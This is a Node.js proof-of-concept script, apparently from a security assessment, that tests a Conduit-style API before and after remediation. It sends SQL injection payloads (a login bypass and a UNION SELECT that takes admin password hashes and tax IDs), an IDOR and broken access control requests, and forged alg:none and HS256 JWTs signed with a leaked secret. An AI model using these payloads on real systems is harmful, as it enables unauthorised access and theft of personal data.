const fs = require('fs');
const path = require('path');
const jwt = require('jsonwebtoken');
const { call } = require('./http');

const OUT = path.join(__dirname, '..', '..', 'evidencias');
fs.mkdirSync(OUT, { recursive: true });
const STATE = process.env.STATE || 'vulnerable'; // 'vulnerable' | 'remediado'
const b64u = o => Buffer.from(JSON.stringify(o)).toString('base64url');

function verdict(step, expectExploit) {
  // exploit "exitoso" si status 200 y no hay error
  const ok200 = step.response.status === 200;
  step.exploited = ok200;
  step.expected = expectExploit ? 'EXPLOTABLE' : 'BLOQUEADO';
  step.result = ok200 ? 'ACCESO/EXPLOTACIÓN CONCEDIDA' : `BLOQUEADO (HTTP ${step.response.status})`;
  return step;
}

(async () => {
  const evidence = { state: STATE, generatedAt: new Date().toISOString(), pocs: {} };

  // ---------- PoC 1: A03:2021 SQL Injection ----------
  const sqli = {};
  // 1a) Bypass de autenticación: comentar el resto de la query
  sqli.bypass = verdict(await call({
    label: 'A03 SQLi - Bypass de login (payload: comentario SQL)',
    method: 'POST', path: '/api/users/login',
    body: { user: { email: "admin@conduit.io'-- ", password: "no-conozco-el-password" } },
  }), true);
  // 1b) Extracción de datos vía UNION (exfiltra hash de password + tax_id del admin)
  const unionPayload =
    "zzz' UNION SELECT id,username,tax_id,password,bio,role,full_name,phone,email FROM users WHERE username='admin'-- ";
  sqli.extraction = verdict(await call({
    label: 'A03 SQLi - Exfiltración vía UNION SELECT',
    method: 'POST', path: '/api/users/login',
    body: { user: { email: unionPayload, password: 'x' } },
  }), true);
  evidence.pocs.A03_SQL_Injection = sqli;

  // Token legítimo de usuario normal (alice) para los siguientes PoCs
  const login = await call({ label: 'login alice', method: 'POST', path: '/api/users/login',
    body: { user: { email: 'alice@corp.io', password: 'alicePass1' } } });
  const aliceToken = login.response.body && login.response.body.user && login.response.body.user.token;

  // ---------- PoC 2: A01:2021 Broken Access Control (escalamiento vertical) ----------
  const bac = {};
  bac.userReachesAdmin = verdict(await call({
    label: 'A01 BAC - Usuario normal accede a panel admin (/api/admin/users)',
    method: 'GET', path: '/api/admin/users',
    headers: { Authorization: 'Token ' + aliceToken },
  }), true);
  evidence.pocs.A01_Broken_Access_Control = bac;

  // ---------- PoC 3: API1:2023 BOLA / IDOR ----------
  const bola = {};
  // alice (id 2) accede a la cuenta de victor (id 3) => PII ajena
  bola.crossUserAccess = verdict(await call({
    label: 'API1 BOLA - Alice accede a PII de Victor (/api/accounts/3)',
    method: 'GET', path: '/api/accounts/3',
    headers: { Authorization: 'Token ' + aliceToken },
  }), true);
  evidence.pocs.API1_BOLA_IDOR = bola;

  // ---------- PoC 4: API2:2023 Broken Authentication (JWT) ----------
  const jwtp = {};
  // 4a) Token alg:none forjado con rol admin (sin firma)
  const noneToken = b64u({ alg: 'none', typ: 'JWT' }) + '.' + b64u({ id: 1, username: 'attacker', role: 'admin' }) + '.';
  jwtp.algNone = verdict(await call({
    label: 'API2 JWT - Token alg:none forjado (rol admin, sin firma)',
    method: 'GET', path: '/api/admin/users',
    headers: { Authorization: 'Token ' + noneToken },
  }), true);
  // 4b) Token HS256 forjado con el secreto filtrado, sin expiración
  const forged = jwt.sign({ id: 1, username: 'attacker', role: 'admin' }, 'supersecret_conduit_key_2024');
  jwtp.forgedHS256 = verdict(await call({
    label: 'API2 JWT - Token HS256 forjado con secreto filtrado',
    method: 'GET', path: '/api/admin/users',
    headers: { Authorization: 'Token ' + forged },
  }), true);
  evidence.pocs.API2_Broken_Auth_JWT = jwtp;

  const file = path.join(OUT, `evidencia_${STATE}.json`);
  fs.writeFileSync(file, JSON.stringify(evidence, null, 2));
  console.log('Evidencia escrita en', file);

  // Resumen legible
  const rows = [];
  for (const [vuln, steps] of Object.entries(evidence.pocs))
    for (const [k, s] of Object.entries(steps))
      rows.push(`${s.exploited ? '❌ EXPLOTADO ' : '✅ BLOQUEADO '} | ${vuln} > ${k} | HTTP ${s.response.status} | ${s.label}`);
  console.log('\n=== RESUMEN (' + STATE + ') ===\n' + rows.join('\n'));
})();
